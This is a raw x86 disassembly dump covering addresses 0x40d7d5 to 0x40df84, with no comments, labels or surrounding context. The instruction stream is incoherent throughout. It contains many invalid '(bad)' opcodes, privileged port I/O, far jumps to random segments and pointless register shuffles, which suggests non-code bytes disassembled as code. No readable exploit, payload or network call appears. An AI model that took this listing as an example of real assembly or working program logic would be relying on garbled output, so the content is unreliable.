  40d7d5:	test   al,0x64
  40d7d7:	jbe    0x40d7cc
  40d7d9:	outs   dx,BYTE PTR ds:[esi]
  40d7da:	fsub   QWORD PTR [edx+0x446c9576]
  40d7e0:	sub    eax,0x462fd3e3
  40d7e5:	mov    cl,0x52
  40d7e7:	fist   DWORD PTR [edi+0x7f35a979]
  40d7ed:	xor    DWORD PTR [ebp+edi*1+0x339ac7bd],esi
  40d7f4:	int3   
  40d7f5:	popa   
  40d7f6:	pop    edx
  40d7f7:	jp     0x40d7c6
  40d7f9:	cdq    
  40d7fa:	mov    ecx,0xe3a0921c
  40d7ff:	xchg   esi,eax
  40d800:	and    eax,0xec789232
  40d805:	and    al,0xc8
  40d807:	cmp    esp,DWORD PTR [edi-0x7966f6a]
  40d80d:	aaa    
  40d80e:	sub    dl,BYTE PTR [ebp-0x26]
  40d811:	mov    esp,fs
  40d813:	and    DWORD PTR ds:0x6c3c0df3,0x503fb5ca
  40d81d:	push   cs
  40d81e:	cmp    cl,BYTE PTR [esi+eiz*4+0x33dd53a8]
  40d825:	xchg   ebp,eax
  40d826:	out    0x0,eax
  40d828:	(bad)  
  40d829:	icebp  
  40d82a:	inc    DWORD PTR [ecx+ebp*4-0x5b6fd4fe]
  40d831:	jl     0x40d80d
  40d833:	rcr    BYTE PTR [ebp+0x140daf34],0xd6
  40d83a:	jne    0x40d842
  40d83c:	add    al,0xe4
  40d83e:	repnz loopne 0x40d880
  40d841:	cld    
  40d842:	into   
  40d843:	add    al,0x50
  40d845:	(bad)  
  40d846:	dec    eax
  40d847:	in     eax,dx
  40d848:	dec    edi
  40d849:	pop    esi
  40d84a:	cmp    eax,0x204e4660
  40d84f:	xchg   ebx,eax
  40d850:	and    DWORD PTR [ebp-0x72fbdfbf],0xffffffd5
  40d857:	xchg   esp,eax
  40d858:	test   al,0xa3
  40d85a:	iret   
  40d85b:	sbb    eax,0xffffffa0
  40d85e:	(bad)  
  40d85f:	ficomp WORD PTR [edx-0x434cfae5]
  40d865:	mov    WORD PTR [eax],ds
  40d867:	imul   ecx,DWORD PTR [ebx],0x1f290504
  40d86d:	mov    fs,ebp
  40d86f:	push   esp
  40d870:	test   eax,0x763907fc
  40d875:	xchg   edi,eax
  40d876:	and    ebp,ebx
  40d878:	mov    ah,0x3b
  40d87a:	test   al,0x23
  40d87c:	and    al,0x7b
  40d87e:	repnz cld 
  40d880:	cmp    BYTE PTR [edi+0x50],bl
  40d883:	add    eax,esp
  40d885:	nop
  40d886:	loopne 0x40d906
  40d888:	sar    DWORD PTR [edi-0x1ebf0e82],1
  40d88e:	xor    DWORD PTR [edi-0x28],edx
  40d891:	(bad)  
  40d892:	jecxz  0x40d8e8
  40d894:	xlat   BYTE PTR ds:[ebx]
  40d895:	les    esp,FWORD PTR [ebx+ebx*8-0x24109d6e]
  40d89c:	std    
  40d89d:	xor    eax,0x99f442c8
  40d8a2:	cmp    ah,bh
  40d8a4:	push   ebx
  40d8a5:	sub    ecx,DWORD PTR ds:0x7471f87f
  40d8ab:	pop    ecx
  40d8ac:	mov    cl,0x9f
  40d8ae:	add    eax,0x3efc0293
  40d8b3:	ret    0xdfe2
  40d8b6:	repnz fistp DWORD PTR [ecx+ebx*4+0x2fb2831]
  40d8be:	daa    
  40d8bf:	cmp    DWORD PTR [ebp+0x25],ecx
  40d8c2:	out    dx,eax
  40d8c3:	and    BYTE PTR [ecx],bl
  40d8c5:	shr    DWORD PTR [ecx],0xeb
  40d8c8:	xchg   ebx,eax
  40d8c9:	lods   eax,DWORD PTR ds:[esi]
  40d8ca:	arpl   di,sp
  40d8cc:	jmp    0x40d879
  40d8ce:	fs aas 
  40d8d0:	xor    bl,BYTE PTR ds:0x80d67ced
  40d8d6:	test   BYTE PTR [edi+0x6e],ah
  40d8d9:	push   edx
  40d8da:	mov    ecx,0xec39e554
  40d8df:	or     eax,0xf14aab65
  40d8e4:	stos   DWORD PTR es:[edi],eax
  40d8e5:	mov    al,ds:0x2238c6d0
  40d8ea:	mov    ebx,0xe78f28b7
  40d8ef:	push   cs
  40d8f0:	jmp    0x40d8ce
  40d8f2:	xchg   BYTE PTR [edi-0x2e95c558],bh
  40d8f8:	not    BYTE PTR [ecx+eax*2]
  40d8fb:	in     eax,0xe7
  40d8fd:	arpl   WORD PTR [eax-0x665c9d28],bx
  40d903:	in     al,0xc0
  40d905:	pop    ebp
  40d906:	sbb    al,0x27
  40d908:	push   es
  40d909:	lahf   
  40d90a:	push   edx
  40d90b:	or     eax,0x3225b4a9
  40d910:	ror    DWORD PTR [ecx+0x7d],1
  40d913:	push   edi
  40d914:	adc    eax,0x2d9b613a
  40d919:	sti    
  40d91a:	je     0x40d96d
  40d91c:	sar    ebx,1
  40d91e:	pop    ss
  40d91f:	adc    BYTE PTR [edi+0x3f],0xea
  40d923:	(bad)  
  40d924:	(bad)  [ebx]
  40d926:	xchg   DWORD PTR [esi-0x57edd75f],eax
  40d92c:	jp     0x40d8ec
  40d92e:	xchg   edx,eax
  40d92f:	adc    DWORD PTR [esi-0x1a05194],eax
  40d935:	stos   BYTE PTR es:[edi],al
  40d936:	pop    edx
  40d937:	sysenter 
  40d939:	lods   al,BYTE PTR ds:[esi]
  40d93a:	test   eax,0x18e1c562
  40d93f:	and    BYTE PTR [ebx-0x29],cl
  40d942:	push   edi
  40d943:	inc    esp
  40d944:	mov    al,ds:0x56eaa088
  40d949:	in     al,dx
  40d94a:	pusha  
  40d94b:	cmp    ecx,DWORD PTR [ecx+eax*1-0x1c]
  40d94f:	jmp    0x92e394b9
  40d954:	es pop ecx
  40d956:	jl     0x40d98f
  40d958:	jbe    0x40d8f3
  40d95a:	aaa    
  40d95b:	pop    edi
  40d95c:	cmp    BYTE PTR [ebp+ecx*8+0x41691995],0x14
  40d964:	sbb    ebx,0xffffff98
  40d967:	dec    ebx
  40d968:	icebp  
  40d969:	pop    ecx
  40d96a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d96b:	sahf   
  40d96c:	(bad)  
  40d96e:	stos   BYTE PTR es:[edi],al
  40d96f:	out    0x71,al
  40d971:	cmp    eax,0xf354b996
  40d976:	inc    esi
  40d977:	sub    ebp,DWORD PTR [edi-0x74]
  40d97a:	adc    ecx,DWORD PTR ds:0x7cccab6d
  40d980:	in     eax,0x39
  40d982:	xor    ecx,DWORD PTR ds:0x424a9f79
  40d988:	test   cl,dh
  40d98a:	add    BYTE PTR [eax+edx*4],bl
  40d98d:	mov    ah,0xf5
  40d98f:	xor    dh,ch
  40d991:	dec    esp
  40d992:	sub    BYTE PTR [ebp-0xb],al
  40d995:	sub    dl,BYTE PTR [ecx]
  40d997:	adc    eax,0x5109e5b9
  40d99c:	test   al,0x92
  40d99e:	push   es
  40d99f:	mov    ds:0x50ac7929,al
  40d9a4:	into   
  40d9a5:	pusha  
  40d9a6:	jmp    0x5486ef46
  40d9ab:	popf   
  40d9ac:	and    eax,DWORD PTR [ebx]
  40d9ae:	rol    DWORD PTR [esi],cl
  40d9b0:	dec    ebp
  40d9b1:	jg     0x40d94b
  40d9b3:	les    ebp,FWORD PTR [edx-0x154d3bb2]
  40d9b9:	repnz aam 0x61
  40d9bc:	std    
  40d9bd:	cmp    DWORD PTR [edi+0x10],ebx
  40d9c0:	jb     0x40d9bd
  40d9c2:	lds    esp,FWORD PTR [edi]
  40d9c4:	(bad)  
  40d9c5:	cmp    ecx,ebx
  40d9c7:	mov    ds:0xd37cebae,eax
  40d9cc:	int    0x43
  40d9ce:	jmp    0x40da31
  40d9d0:	ret    0x4017
  40d9d3:	pop    es
  40d9d4:	add    eax,0x6cdaf05b
  40d9d9:	jne    0x40da13
  40d9db:	sbb    eax,DWORD PTR [esi]
  40d9dd:	pushf  
  40d9de:	aaa    
  40d9df:	rcl    ch,1
  40d9e1:	xchg   ecx,eax
  40d9e2:	jge    0x40d9d0
  40d9e4:	int3   
  40d9e5:	neg    DWORD PTR [eax+0x36107ea4]
  40d9eb:	push   es
  40d9ec:	pushf  
  40d9ed:	and    eax,0x4939d8f0
  40d9f2:	test   BYTE PTR [edi+0x465789d0],bl
  40d9f8:	cmp    eax,0x1e20ae53
  40d9fd:	inc    ecx
  40d9fe:	pop    edx
  40d9ff:	mov    esp,0xfcc8d29a
  40da04:	adc    al,0x38
  40da06:	ss repz jge 0x40da09
  40da0a:	icebp  
  40da0b:	xor    eax,DWORD PTR [ecx-0x6996b044]
  40da11:	cli    
  40da12:	fs pop esi
  40da14:	xchg   esi,eax
  40da15:	cs xchg ebp,eax
  40da17:	aas    
  40da18:	or     eax,0x437f3780
  40da1d:	push   ecx
  40da1e:	sbb    eax,0xb1999712
  40da23:	call   0xb2f0:0x64b5acd
  40da2a:	adc    eax,0x5c2b69f6
  40da2f:	stos   BYTE PTR es:[edi],al
  40da30:	inc    edi
  40da31:	jmp    0x40d9f8
  40da33:	sti    
  40da34:	push   edi
  40da35:	and    ch,BYTE PTR ds:0x3acb328
  40da3b:	mov    eax,0x209d485b
  40da40:	addr16 je 0x40d9e4
  40da43:	adc    eax,0x6d33d382
  40da48:	pop    esi
  40da49:	mov    ecx,0x60f0fcef
  40da4e:	and    al,0x98
  40da50:	inc    esi
  40da51:	push   ss
  40da52:	sub    bl,BYTE PTR [ecx]
  40da54:	mov    ah,0x53
  40da56:	inc    ecx
  40da57:	push   edi
  40da58:	mov    dh,0xae
  40da5a:	pop    ebp
  40da5b:	lea    edx,[edi+0x5a]
  40da5e:	adc    BYTE PTR [edi+0x3960ab66],0xbc
  40da65:	dec    esp
  40da66:	retf   0xf3b9
  40da69:	add    ah,bl
  40da6b:	loope  0x40da4d
  40da6d:	hlt    
  40da6e:	jle    0x40da03
  40da70:	mov    cl,0x55
  40da72:	mov    ah,0xa1
  40da74:	or     BYTE PTR [edx-0x70],cl
  40da77:	out    0x9b,al
  40da79:	ret    0x5f0c
  40da7c:	adc    DWORD PTR [esi+0x7ee460db],ebx
  40da82:	pop    es
  40da83:	jbe    0x40da20
  40da85:	cmc    
  40da86:	adc    eax,0xe20c0122
  40da8b:	add    al,0xd6
  40da8d:	push   esi
  40da8e:	push   ebp
  40da8f:	ds jp  0x40da4d
  40da92:	cmp    esi,DWORD PTR [edx]
  40da94:	std    
  40da95:	(bad)  
  40da96:	or     al,0x36
  40da98:	mov    ebp,0xf8a11eb0
  40da9d:	push   ecx
  40da9e:	dec    ebx
  40da9f:	or     ah,BYTE PTR [ebx+0x42745022]
  40daa5:	sar    BYTE PTR [edi+0x2b],cl
  40daa8:	sbb    bl,BYTE PTR [esi+0x2d]
  40daab:	cld    
  40daac:	dec    esi
  40daad:	jle    0x40da53
  40daaf:	and    eax,eax
  40dab1:	push   0x1
  40dab3:	sbb    BYTE PTR [eax+0x2],bh
  40dab6:	cmc    
  40dab7:	and    eax,0x365040b8
  40dabc:	(bad)  
  40dabd:	fadd   DWORD PTR [ebx+0x4e]
  40dac0:	pop    ds
  40dac1:	add    al,0xf8
  40dac3:	out    0x22,eax
  40dac5:	je     0x40da99
  40dac7:	stos   BYTE PTR es:[edi],al
  40dac8:	mov    bh,0x40
  40daca:	pop    ds
  40dacb:	(bad)  
  40dacc:	fst    DWORD PTR [eax]
  40dace:	xor    eax,0xbb1fb234
  40dad3:	jno    0x40db48
  40dad5:	(bad)  
  40dad6:	jge    0x40db56
  40dad8:	adc    DWORD PTR [eax+edx*4],esi
  40dadb:	add    bh,BYTE PTR [edi]
  40dadd:	bound  esp,QWORD PTR [esp+eiz*2+0x75]
  40dae1:	or     DWORD PTR [ecx],esp
  40dae3:	xchg   edi,eax
  40dae4:	outs   dx,BYTE PTR ds:[esi]
  40dae5:	(bad)  
  40dae6:	jns    0x40daf1
  40dae8:	test   al,0xc3
  40daea:	fmul   QWORD PTR [edx]
  40daec:	adc    ecx,DWORD PTR [esi]
  40daee:	sub    DWORD PTR [ebx],edx
  40daf0:	inc    edi
  40daf1:	pop    esi
  40daf2:	aam    0xb2
  40daf4:	dec    esi
  40daf5:	sbb    al,0xcd
  40daf7:	pop    ecx
  40daf8:	mov    bh,0x88
  40dafa:	mov    DWORD PTR [ebx-0x77814391],eax
  40db00:	cmp    ah,BYTE PTR [eax-0x53]
  40db03:	shr    BYTE PTR [ecx+0x76],0x9b
  40db07:	fist   WORD PTR [ebp-0x2d]
  40db0a:	das    
  40db0b:	pusha  
  40db0c:	test   al,0x34
  40db0e:	test   al,0x5
  40db10:	sahf   
  40db11:	adc    ecx,ebx
  40db13:	cmp    DWORD PTR [ecx+0x426c8c57],ebx
  40db19:	add    eax,0x8c40a3ed
  40db1e:	xor    DWORD PTR [ebx+eax*2],0x40
  40db22:	push   esi
  40db23:	mov    eax,0x86f64122
  40db28:	in     eax,dx
  40db29:	jne    0x40db7b
  40db2b:	cmc    
  40db2c:	jne    0x40dae4
  40db2e:	jmp    0xc208:0x18404831
  40db35:	stos   BYTE PTR es:[edi],al
  40db36:	cmp    eax,DWORD PTR [edi-0x77]
  40db39:	xor    al,BYTE PTR [eax+0x43]
  40db3c:	mov    bh,al
  40db3e:	pop    edi
  40db3f:	mov    cl,0x4d
  40db41:	sub    bh,ah
  40db43:	in     eax,dx
  40db44:	add    al,0x72
  40db46:	repnz cmp al,bh
  40db49:	(bad)  
  40db4a:	iret   
  40db4b:	pop    ecx
  40db4c:	xor    BYTE PTR [edi+0x1f],ch
  40db4f:	ret    0x956b
  40db52:	mov    al,BYTE PTR [edx-0x3a]
  40db55:	push   bx
  40db57:	dec    ebx
  40db58:	adc    WORD PTR [ecx+0x68],cx
  40db5c:	neg    BYTE PTR [edx]
  40db5e:	xchg   ch,dl
  40db60:	pop    edx
  40db61:	ss and eax,0x76b9f54c
  40db67:	push   ds
  40db68:	ret    
  40db69:	xchg   edx,eax
  40db6a:	dec    ebp
  40db6b:	inc    esp
  40db6c:	inc    esi
  40db6d:	cmp    ch,bh
  40db6f:	(bad)  
  40db70:	ss jl  0x40dafc
  40db73:	popa   
  40db74:	push   cs
  40db75:	and    eax,0x471565e0
  40db7a:	adc    ch,BYTE PTR cs:[eax+0x3cd5184d]
  40db81:	retf   
  40db82:	cmp    ebp,DWORD PTR [ebx+0x4e9e8f5e]
  40db88:	sbb    BYTE PTR [eax],0xdb
  40db8b:	sbb    al,0x17
  40db8d:	pop    edx
  40db8e:	gs push eax
  40db90:	int    0x9e
  40db92:	push   esp
  40db93:	in     al,dx
  40db94:	xlat   BYTE PTR ds:[ebx]
  40db95:	icebp  
  40db96:	rcl    DWORD PTR [ebx-0x79],cl
  40db99:	push   ss
  40db9a:	xor    bh,BYTE PTR [ebx]
  40db9c:	push   edi
  40db9d:	fldenv [esi+0x696a2f3]
  40dba3:	sar    ecx,0x78
  40dba6:	(bad)  
  40dba7:	sub    eax,0x4c88a360
  40dbac:	in     al,dx
  40dbad:	daa    
  40dbae:	imul   esi,DWORD PTR [ecx],0xdcdd4346
  40dbb4:	xor    dh,dl
  40dbb6:	mov    ds:0x40d2c4e1,eax
  40dbbb:	push   cs
  40dbbc:	int    0xf7
  40dbbe:	push   0xffffff98
  40dbc0:	dec    ebx
  40dbc1:	mov    eax,ds:0xc1806094
  40dbc6:	cmc    
  40dbc7:	ja     0x40dc00
  40dbc9:	cmp    al,0x99
  40dbcb:	inc    ecx
  40dbcc:	mov    eax,0x4352cbd
  40dbd1:	mov    ecx,0xf2ac57e1
  40dbd6:	jmp    0x716a:0x3f7977ce
  40dbdd:	mov    edx,0x9b39899c
  40dbe2:	jno    0x40dbbc
  40dbe4:	jmp    DWORD PTR [edi+ecx*2]
  40dbe7:	in     al,0xd
  40dbe9:	mov    ds:0x92e5a761,eax
  40dbee:	sbb    BYTE PTR ds:0xf93780e4,0xbd
  40dbf5:	int    0xb
  40dbf7:	and    BYTE PTR [ebx],0x83
  40dbfa:	sub    DWORD PTR es:0xba6c7c06,esp
  40dc01:	into   
  40dc02:	adc    al,0xb6
  40dc04:	or     bl,0xce
  40dc07:	ret    
  40dc08:	pop    ecx
  40dc09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc0b:	dec    edx
  40dc0c:	jae    0x40dc2b
  40dc0e:	jge    0x40dbb3
  40dc10:	stos   DWORD PTR es:[edi],eax
  40dc11:	fwait
  40dc12:	sub    DWORD PTR [edi+0x27],esi
  40dc15:	jno    0x40dc3c
  40dc17:	add    ah,dh
  40dc19:	jecxz  0x40dc73
  40dc1b:	loope  0x40dbd1
  40dc1d:	sbb    DWORD PTR [edx],esp
  40dc1f:	jg     0x40dc3b
  40dc21:	call   0x25dee925
  40dc26:	daa    
  40dc27:	mov    fs,WORD PTR [eax]
  40dc29:	repz out 0x4,eax
  40dc2c:	add    bl,BYTE PTR [ebp+0x152bf578]
  40dc32:	add    edi,ebp
  40dc34:	leave  
  40dc35:	sbb    dl,BYTE PTR [edi-0x14d0c89d]
  40dc3b:	jo     0x40dca4
  40dc3d:	repnz ins DWORD PTR es:[edi],dx
  40dc3f:	inc    ebp
  40dc40:	add    DWORD PTR [esi],0x15eb7b53
  40dc46:	(bad)  
  40dc47:	xor    ch,BYTE PTR [ebx-0x5a21b709]
  40dc4d:	icebp  
  40dc4e:	mov    WORD PTR [edx+0x7eb8c024],gs
  40dc54:	xchg   ebx,eax
  40dc55:	fadd   QWORD PTR [ecx-0xd]
  40dc58:	add    esp,DWORD PTR [edi+0x34]
  40dc5b:	fisub  WORD PTR [edi-0x3]
  40dc5e:	das    
  40dc5f:	xchg   edi,eax
  40dc60:	push   edx
  40dc61:	push   cs
  40dc62:	dec    ebx
  40dc63:	or     eax,0x7a76d544
  40dc68:	and    dl,BYTE PTR [eax-0x6c]
  40dc6b:	test   BYTE PTR [edx-0x46af6d27],bl
  40dc71:	inc    edx
  40dc72:	jne    0x40dcde
  40dc74:	jno    0x40dc81
  40dc76:	inc    esp
  40dc77:	and    DWORD PTR [ebp-0x1c32300a],edx
  40dc7d:	push   ss
  40dc7e:	jl     0x40dc43
  40dc80:	push   ecx
  40dc81:	vpandn ymm3,ymm3,YMMWORD PTR [eax]
  40dc85:	or     cl,BYTE PTR [edx+0x1e3fae17]
  40dc8b:	sub    cl,0xb4
  40dc8e:	mov    esi,ebp
  40dc90:	cli    
  40dc91:	mov    edi,0xbbb7b007
  40dc96:	and    DWORD PTR [ebp-0x311673e7],eax
  40dc9c:	retf   0x2b7f
  40dc9f:	retf   0x532b
  40dca2:	and    eax,0x79ab1862
  40dca7:	add    eax,0xa70c3b9d
  40dcac:	icebp  
  40dcad:	fisttp WORD PTR [eax-0x168a2888]
  40dcb3:	cmp    ch,dh
  40dcb5:	(bad)  [edx-0x76]
  40dcb8:	push   ecx
  40dcb9:	inc    eax
  40dcba:	jns    0x40dd19
  40dcbc:	jmp    0x40dc79
  40dcbe:	int3   
  40dcbf:	stos   BYTE PTR es:[edi],al
  40dcc0:	int3   
  40dcc1:	in     eax,0x9f
  40dcc3:	lods   al,BYTE PTR ds:[esi]
  40dcc4:	push   ds
  40dcc5:	test   BYTE PTR [ebx],bl
  40dcc7:	stc    
  40dcc8:	shr    BYTE PTR [edi+0xbe5371e],cl
  40dcce:	add    al,0xf6
  40dcd0:	pop    ss
  40dcd1:	lods   eax,DWORD PTR ds:[esi]
  40dcd2:	je     0x40dd4e
  40dcd4:	jae    0x40dc9f
  40dcd6:	in     al,dx
  40dcd7:	sbb    bl,dh
  40dcd9:	push   ss
  40dcda:	mov    fs,WORD PTR [edi+0x3c8f358c]
  40dce0:	jnp    0x40dcc0
  40dce2:	ins    BYTE PTR es:[edi],dx
  40dce3:	xchg   ebx,eax
  40dce4:	jge    0x40dcd3
  40dce6:	fsub   QWORD PTR [eax+0x71]
  40dce9:	or     BYTE PTR [edx+esi*8+0x11373edf],0xdc
  40dcf1:	or     dl,BYTE PTR [edx]
  40dcf3:	fldenv [esi+0x4290e2f6]
  40dcf9:	std    
  40dcfa:	cmp    al,0x13
  40dcfc:	imul   esp,eax,0x16a52f54
  40dd02:	aaa    
  40dd03:	or     eax,0x23e3ad26
  40dd08:	add    eax,0xe1878cdc
  40dd0d:	push   ss
  40dd0e:	aam    0x6e
  40dd10:	int3   
  40dd11:	and    edi,DWORD PTR [edx+0x78f06d15]
  40dd17:	jne    0x40dca5
  40dd19:	dec    esp
  40dd1a:	jl     0x40dca9
  40dd1c:	or     eax,0x970f4060
  40dd21:	enter  0x5a19,0xdc
  40dd25:	cmp    BYTE PTR [edx+edx*1+0x4],dl
  40dd29:	popa   
  40dd2a:	add    BYTE PTR [edi+0x3b229e30],cl
  40dd30:	test   BYTE PTR [ecx-0x4b],bh
  40dd33:	mov    ebx,0x92563504
  40dd38:	mov    esp,0x4d92ef46
  40dd3d:	mov    eax,ds:0xb8ce6789
  40dd42:	add    ebp,DWORD PTR [edi+eiz*4-0x5d0f41e7]
  40dd49:	pop    esp
  40dd4a:	test   BYTE PTR [ecx+0x55],al
  40dd4d:	lods   al,BYTE PTR ds:[esi]
  40dd4e:	mov    edx,0x777f08cd
  40dd53:	sbb    esi,DWORD PTR [edx+0x334130b2]
  40dd59:	ja     0x40dd73
  40dd5b:	adc    eax,0x20c183ac
  40dd60:	push   ebp
  40dd61:	rol    DWORD PTR [eax-0x5b],1
  40dd64:	inc    ebp
  40dd65:	cmp    BYTE PTR [edx],bl
  40dd67:	jo     0x40dd07
  40dd69:	mov    dl,dh
  40dd6b:	xchg   esp,eax
  40dd6c:	xor    BYTE PTR [edx+0x5],dh
  40dd6f:	mov    al,0xd8
  40dd71:	popf   
  40dd72:	mov    esp,0xa5d7d457
  40dd77:	pop    edi
  40dd78:	pop    ds
  40dd79:	sbb    al,0x84
  40dd7b:	sbb    esi,DWORD PTR [edi]
  40dd7d:	not    BYTE PTR [edx+edi*1+0x42a0fda9]
  40dd84:	xchg   cl,al
  40dd86:	mov    ch,dl
  40dd88:	mov    al,ds:0xb80c385c
  40dd8d:	xchg   BYTE PTR [esi+0x65],bh
  40dd90:	xor    eax,0xc5b2edc4
  40dd95:	cli    
  40dd96:	jp     0x40ddbf
  40dd98:	push   es
  40dd99:	int3   
  40dd9a:	and    eax,0x41ae827e
  40dd9f:	mov    esi,0x998406
  40dda4:	mov    edi,0x1f1a60df
  40dda9:	shr    DWORD PTR [edx+esi*2],cl
  40ddac:	push   ebx
  40ddad:	push   ebx
  40ddae:	xchg   edi,eax
  40ddaf:	aas    
  40ddb0:	xchg   esp,eax
  40ddb1:	mov    ebx,0x634b6779
  40ddb6:	xor    DWORD PTR [ebp-0x35083b6f],esp
  40ddbc:	lock mov ebx,DWORD PTR [edx-0x41288a14]
  40ddc3:	inc    esp
  40ddc4:	out    dx,al
  40ddc5:	xchg   ebx,eax
  40ddc6:	sub    al,BYTE PTR [esi-0x354ccdcb]
  40ddcc:	or     ah,BYTE PTR [esi]
  40ddce:	or     edx,esp
  40ddd0:	sbb    al,0xa5
  40ddd2:	pop    ecx
  40ddd3:	in     al,0xf4
  40ddd5:	call   0xb72ecb58
  40ddda:	cld    
  40dddb:	dec    esp
  40dddc:	data16 mov dl,0x5c
  40dddf:	mov    DWORD PTR [ebx-0x77],esp
  40dde2:	out    0x4f,eax
  40dde4:	int    0x31
  40dde6:	addr16 cs jae 0x40dddf
  40ddea:	mov    bh,0x46
  40ddec:	pop    ebp
  40dded:	retf   0x3902
  40ddf0:	mov    DWORD PTR [ebx-0x4755ec0],0x9ef28a7f
  40ddfa:	push   es
  40ddfb:	jno    0x40de54
  40ddfd:	repnz xchg ecx,eax
  40ddff:	(bad)  
  40de00:	lock scas eax,DWORD PTR es:[edi]
  40de02:	in     eax,0xb7
  40de04:	mov    esp,0xa5a23b28
  40de09:	loop   0x40ddad
  40de0b:	ins    BYTE PTR es:[edi],dx
  40de0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de0d:	fisub  DWORD PTR [ebx+edx*1]
  40de10:	mov    dl,0xa8
  40de12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de13:	scas   eax,DWORD PTR es:[edi]
  40de14:	pop    edi
  40de15:	stos   DWORD PTR es:[edi],eax
  40de16:	xor    al,0xa6
  40de18:	mov    esp,0xe9bccae9
  40de1d:	(bad)  
  40de1e:	test   DWORD PTR [eax+0x60],0x4d58577e
  40de25:	pop    ss
  40de26:	icebp  
  40de27:	mov    bh,0x33
  40de29:	pusha  
  40de2a:	mov    dh,0x46
  40de2c:	ret    
  40de2d:	dec    ecx
  40de2e:	xrelease mov BYTE PTR [ebp-0xe],cl
  40de32:	pop    edi
  40de33:	and    esp,DWORD PTR [esp+ebx*1]
  40de36:	mov    esi,0xa6ce138d
  40de3b:	outs   dx,BYTE PTR ds:[esi]
  40de3c:	push   edi
  40de3d:	ficomp WORD PTR [edx+0x76a23491]
  40de43:	pop    esp
  40de44:	(bad)  
  40de45:	fbstp  TBYTE PTR [edi+0x34c77214]
  40de4b:	std    
  40de4c:	sub    BYTE PTR [esi],cl
  40de4e:	aas    
  40de4f:	test   BYTE PTR [edx+0x5a],ah
  40de52:	or     BYTE PTR [esi+0x31841c23],ah
  40de58:	pop    esp
  40de59:	fisttp DWORD PTR [ecx+0x386b1814]
  40de5f:	ins    DWORD PTR es:[edi],dx
  40de60:	push   esi
  40de61:	repnz fstp st(5)
  40de64:	pop    ecx
  40de65:	hlt    
  40de66:	mov    bh,0xbd
  40de68:	jge    0x40debd
  40de6a:	mov    gs,WORD PTR [ebp-0x19]
  40de6d:	and    al,0xcc
  40de6f:	arpl   bp,di
  40de71:	mov    bh,BYTE PTR [esi+0x56]
  40de74:	inc    edx
  40de75:	lea    edi,ds:0xa24efb9
  40de7b:	int    0x1c
  40de7d:	mov    ah,BYTE PTR [ebx-0x58f6c674]
  40de83:	call   0x63b0507f
  40de88:	cwde   
  40de89:	xor    al,0x1
  40de8b:	(bad)  
  40de8c:	aad    0x44
  40de8e:	add    eax,DWORD PTR [ebx+0x64e087a4]
  40de94:	test   eax,0xcd3a4c3
  40de99:	sub    eax,0x942fc074
  40de9e:	pop    edx
  40de9f:	xchg   edi,eax
  40dea0:	fbstp  TBYTE PTR fs:[ebx]
  40dea3:	repnz mov ah,0x2a
  40dea6:	add    ebp,edx
  40dea8:	inc    ebx
  40dea9:	dec    ebp
  40deaa:	cmp    BYTE PTR [esi-0x7ac9ffaa],al
  40deb0:	cmc    
  40deb1:	cs mov dl,0xe1
  40deb4:	and    ebx,DWORD PTR ds:0xf16a5d95
  40deba:	dec    ebx
  40debb:	jge    0x40deda
  40debd:	jns    0x40df3e
  40debf:	sub    al,0x49
  40dec1:	addr16 cs sar ah,0x14
  40dec6:	jg     0x40df2a
  40dec8:	jge    0x40df32
  40deca:	cmp    ebp,DWORD PTR [ecx-0x6be7d8a8]
  40ded0:	les    eax,FWORD PTR gs:[ecx+0x2eb1cca6]
  40ded7:	into   
  40ded8:	ret    0x8d99
  40dedb:	mov    dh,0x2
  40dedd:	jns    0x40de9e
  40dedf:	jae    0x40df1e
  40dee1:	and    al,0x9b
  40dee3:	pop    ebp
  40dee4:	mov    dl,0x30
  40dee6:	shl    DWORD PTR [edi+0x6e0ad329],1
  40deec:	iret   
  40deed:	mov    ch,0x76
  40deef:	jno    0x40df0b
  40def1:	inc    esi
  40def2:	inc    edi
  40def3:	add    al,0xdd
  40def5:	test   BYTE PTR [edx+0xa48c92d],dl
  40defb:	xchg   DWORD PTR [eax],ebp
  40defd:	push   ebx
  40defe:	mov    dh,0xb0
  40df00:	sti    
  40df01:	bound  ecx,QWORD PTR [ebx-0x60852ebb]
  40df07:	js     0x40de8e
  40df09:	popa   
  40df0a:	pop    esi
  40df0b:	pop    eax
  40df0c:	xchg   esp,eax
  40df0d:	fs cmc 
  40df0f:	pop    ebx
  40df10:	jl     0x40df3a
  40df12:	xchg   ebx,eax
  40df13:	cmp    eax,0x17213053
  40df18:	scas   eax,DWORD PTR es:[edi]
  40df19:	jae    0x40df77
  40df1b:	retf   0xfe44
  40df1e:	sub    edi,DWORD PTR [esi]
  40df20:	sbb    al,0x5a
  40df22:	test   DWORD PTR [ebx],ecx
  40df24:	add    al,0x4a
  40df26:	retf   0xa731
  40df29:	shl    DWORD PTR [ebp+0x2e3bdd9e],1
  40df2f:	xor    esp,DWORD PTR [ecx]
  40df31:	std    
  40df32:	fld    QWORD PTR [esi-0x11]
  40df35:	nop
  40df36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df37:	lods   eax,DWORD PTR ds:[esi]
  40df38:	je     0x40deea
  40df3a:	aas    
  40df3b:	sbb    cl,BYTE PTR ds:0xd69a667
  40df41:	sub    esi,esi
  40df43:	push   0xffffffb7
  40df45:	and    eax,0xfcc77eb0
  40df4a:	xchg   edx,eax
  40df4b:	fwait
  40df4c:	pop    esp
  40df4d:	sbb    DWORD PTR [ebp-0x1a533f19],ebx
  40df53:	pop    ss
  40df54:	dec    eax
  40df55:	scas   al,BYTE PTR es:[edi]
  40df56:	mov    WORD PTR [ebp-0x11],gs
  40df59:	stos   DWORD PTR es:[edi],eax
  40df5a:	or     al,BYTE PTR [esi*1+0x1bccdb8c]
  40df61:	mov    eax,0x4dbcd364
  40df66:	clc    
  40df67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df68:	pop    edi
  40df69:	add    al,0x1f
  40df6b:	in     eax,0x94
  40df6d:	arpl   WORD PTR [ebp+0x2d],di
  40df70:	inc    ebx
  40df71:	dec    esi
  40df72:	xchg   ebx,eax
  40df73:	mov    esp,0xe45b787e
  40df78:	and    ah,ah
  40df7a:	fwait
  40df7b:	mov    esp,0xf1732c7a
  40df80:	ss push ss
  40df82:	jns    0x40dfad
  40df84:	sti    
